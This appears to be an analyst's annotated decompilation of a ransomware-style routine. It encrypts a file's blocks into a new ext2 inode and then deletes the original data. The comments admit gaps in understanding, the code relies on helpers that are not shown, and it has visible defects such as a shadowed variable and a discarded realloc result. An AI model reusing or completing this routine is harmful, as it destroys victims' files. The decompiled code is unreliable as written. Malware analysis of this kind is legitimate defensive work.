int64_t encrypt_file(char* name)
{
    return encrypt_file2(name);
}

int64_t encrypt_file2(char* name)
{
    int32_t inode = 0;
    int32_t len_read = 0;
    uint64_t blocksize = ((uint64_t)fs->blocksize);
    void* block = xcalloc(1, blocksize); // Allocate data for encrypted block
    int64_t fd = get_size(name); // Get the file size
    if (fd != 0)
    {
        fd = open(name, 2); // Open the file
        int32_t fd = fd;
        if (fd != 0xffffffff)
        {
            if (inode == 0)
                // Create an inode for the encrypted file
                ext2fs_new_inode(fs, 0, 0x41ed, 0, &inode);

            ext2fs_inode_alloc_stats2(fs, ((uint64_t)inode), 1, 1);
            char stop = 0;
            int64_t nb_blocks = 1;
            uint64_t* blocks = xcalloc(1, 0x10);
            do
            {
                // Fill the block with file data
                if (fill_block(fd, block, blocksize, &len_read) == 0)
                    break;

                // Determine if another block is needed to encrypt the file
                int32_t n_blocks = len_read / 0x1000;
                if (len_read % 0x1000 != 0)
                    stop = 1;

                // Encrypt the block
                encrypt_block(block, ((int64_t)len_read));

                // Write encrypted block to the filesystem
                int64_t new_block = write_block(block, ((uint64_t)fs->blocksize), inode);

                // Some stuff I did not bother to understand
                // probably setting up recursive blocks for big files
                // or preparing new empty blocks for the file that must be
                // emptied
                // but I do not know nor does it really matter for now
                if (blocks[((nb_blocks - 1) * 2)] == 0)
                {
                    blocks[((nb_blocks - 1) * 2)] = new_block;
                    blocks[(((nb_blocks - 1) * 2) + 1)] = new_block;
                }
                else if ((blocks[(((nb_blocks - 1) * 2) + 1)] + 1) != new_block)
                {
                    nb_blocks = (nb_blocks + 1);
                    realloc(blocks, (nb_blocks << 4));
                    blocks[((nb_blocks - 1) * 2)] = new_block;
                    blocks[(((nb_blocks - 1) * 2) + 1)] = new_block;
                }
                else
                    blocks[(((nb_blocks - 1) * 2) + 1)] = new_block;

                memset(block, 0, ((uint64_t)fs->blocksize));
            } while ((stop & 1) == 0);
            // Remove data from the original file
            fd = delete_data(name, nb_blocks, blocks);
        }
    }
    return fd;
}

